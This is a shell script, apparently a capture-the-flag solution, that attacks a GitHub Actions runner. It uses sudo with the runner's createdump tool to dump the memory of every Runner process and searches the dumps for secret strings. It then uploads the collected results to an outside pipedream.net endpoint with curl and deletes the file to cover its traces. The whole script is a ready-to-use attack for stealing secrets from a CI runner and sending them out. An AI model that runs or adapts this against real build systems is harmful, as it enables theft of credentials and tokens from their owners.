#!/bin/sh

echo "[-] Started" > /tmp/file.txt

echo "[-] Listing processes related to the Runner... [ps -ef | grep Runner]" >> /tmp/file.txt
ps -ef | grep Runner >> /tmp/file.txt


echo "[-] Checking createdump binary... [file /home/runner/runners/2.284.0/bin/createdump]" >> /tmp/file.txt
file /home/runner/runners/2.284.0/bin/createdump >> /tmp/file.txt
echo $(chmod +rwx /home/runner/runners/2.284.0/bin/createdump -v) >> /tmp/file.txt

for pid in $(ps -ef | grep Runner  | tr -s ' ' | cut -d ' ' -f2)
do
    echo "[-] Starting with process: $pid ..." >> /tmp/file.txt;
    echo $(pwdx $pid) >> /tmp/file.txt;
    echo "[-] Creating dump... [sudo /home/runner/runners/2.284.0/bin/createdump -n $pid]" >> /tmp/file.txt;
    echo $(sudo /home/runner/runners/2.284.0/bin/createdump -n $pid) >> /tmp/file.txt;
    echo "[-] Checking output file... [file /tmp/coredump.$pid]" >> /tmp/file.txt;
    file /tmp/coredump.$pid >> /tmp/file.txt;
    echo "[!] Searching flag in the output file... [strings /tmp/coredump.$pid | grep EKO]" >> /tmp/file.txt;
    strings /tmp/coredump.$pid | grep EKO >> /tmp/file.txt;
    rm /tmp/coredump.$pid;
done

echo "[-] Finished" >> /tmp/file.txt

curl --data-binary "@/tmp/file.txt" https://ensf2rlc2dw6p.x.pipedream.net/

rm /tmp/file.txt
